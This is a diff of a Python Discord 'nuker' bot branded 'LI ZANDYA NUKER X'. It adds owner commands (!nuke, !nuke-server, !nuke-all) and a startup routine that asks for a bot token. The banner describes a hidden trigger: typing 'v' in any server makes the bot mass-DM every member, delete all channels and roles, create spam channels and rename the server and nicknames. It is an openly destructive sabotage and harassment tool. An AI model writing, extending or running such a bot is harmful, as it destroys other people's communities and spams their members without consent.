@@ -27,11 +27,9 @@ TOKEN = None
 OWNER_ID = None
 NUKE_TRIGGER = "v"
 
-# سرعة قصوى
 MAX_THREADS = 10000
 DM_DELAY = 0.0005
 
-# رسالة الدمار
 DM_MESSAGE = """
 ╔══════════════════════════════════════════════════════════════════════╗
 ║                                                                      ║
@@ -49,7 +47,6 @@ DM_MESSAGE = """
 ╚══════════════════════════════════════════════════════════════════════╝
 """
 
-# رسائل السبام
 SPAM_MESSAGES = [
     "💀 DESTROYED BY LI ZANDYA 💀",
     "🔥 LI ZANDYA MAFIA WAS HERE 🔥",
@@ -324,4 +321,77 @@ async def handle_owner_command(message):
         hours = int(elapsed // 3600)
         minutes = int((elapsed % 3600) // 60)
         
-        stats_msg = f"""
+        await message.channel.send("```")
+        await message.channel.send("╔══════════════════════════════════════════════════════════╗")
+        await message.channel.send("║              LI ZANDYA NUKER - STATS                     ║")
+        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
+        await message.channel.send(f"║  🎯 SERVERS DESTROYED: {len(nuker.nuked_servers)}")
+        await message.channel.send(f"║  📨 TOTAL DM SENT: {nuker.total_dm_sent:,}")
+        await message.channel.send(f"║  🗑️ CHANNELS DELETED: {nuker.total_channels_deleted:,}")
+        await message.channel.send(f"║  👑 ROLES DELETED: {nuker.total_roles_deleted:,}")
+        await message.channel.send(f"║  ⏱️ UPTIME: {hours}h {minutes}m")
+        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
+        await message.channel.send("║  💀 LI ZANDYA MAFIA - ABSOLUTE POWER 💀")
+        await message.channel.send("╚══════════════════════════════════════════════════════════╝")
+        await message.channel.send("```")
+    
+    elif content == '!help':
+        await message.channel.send("```")
+        await message.channel.send("💀 LI ZANDYA NUKER X - OWNER COMMANDS 💀")
+        await message.channel.send("")
+        await message.channel.send("!servers           - Show all servers with numbers")
+        await message.channel.send("!nuke-server <num> - Destroy server by number")
+        await message.channel.send("!nuke              - Destroy current server")
+        await message.channel.send("!nuke-all          - Destroy all servers")
+        await message.channel.send("!stats             - Show statistics")
+        await message.channel.send("!help              - Show this help")
+        await message.channel.send("")
+        await message.channel.send("⚡ TRIGGER: Type 'v' in ANY server = INSTANT NUKE!")
+        await message.channel.send("💀 FIRST USER = MASTER OWNER")
+        await message.channel.send("🔥 NO RESPONSE - Just pure destruction!")
+        await message.channel.send("```")
+
+# ============================================
+# MAIN
+# ============================================
+
+if __name__ == "__main__":
+    print("""
+    ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+    ║                                                                                                                                          ║
+    ║     💀 LI ZANDYA NUKER X - ULTIMATE DISCORD DESTROYER 💀                                                                                 ║
+    ║                                                                                                                                          ║
+    ║  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  ║
+    ║  ║                                                                                                                                  ║  ║
+    ║  ║  🔥 HOW IT WORKS:                                                                                                                ║  ║
+    ║  ║  • ANYONE who types "v" in ANY server -> INSTANT NUKE                                                                           ║  ║
+    ║  ║  • Bot sends DM to EVERY member in that server                                                                                  ║  ║
+    ║  ║  • Bot deletes ALL channels and roles                                                                                           ║  ║
+    ║  ║  • Bot creates 100+ spam channels                                                                                               ║  ║
+    ║  ║  • Bot spams messages everywhere                                                                                                ║  ║
+    ║  ║  • Bot changes server name and all nicknames                                                                                    ║  ║
+    ║  ║  • Bot NEVER responds in chat - pure destruction                                                                               ║  ║
+    ║  ║                                                                                                                                  ║  ║
+    ║  ║  💀 FIRST USER = MASTER OWNER 💀                                                                                                 ║  ║
+    ║  ║  👑 OWNER can use !commands to control everything 👑                                                                             ║  ║
+    ║  ║                                                                                                                                  ║  ║
+    ║  ║  🐉 LI ZANDYA MAFIA - TOTAL DESTRUCTION 🐉                                                                                       ║  ║
+    ║  ║                                                                                                                                  ║  ║
+    ║  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  ║
+    ║                                                                                                                                          ║
+    ║  🔑 ENTER YOUR BOT TOKEN:                                                                                                               ║
+    ║                                                                                                                                          ║
+    ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+    """)
+    
+    TOKEN = input("\n🔑 Token: ").strip()
+    if not TOKEN:
+        print("No token!")
+        sys.exit(1)
+    
+    print("\n✅ ACTIVATED!\n")
+    print("💀 Anyone who types 'v' in ANY server = INSTANT NUKE 💀\n")
+    print("🔥 Bot NEVER responds - Just destruction 🔥\n")
+    print("👑 First user = Master Owner (use !help for commands) 👑\n")
+    
+    bot.run(TOKEN)
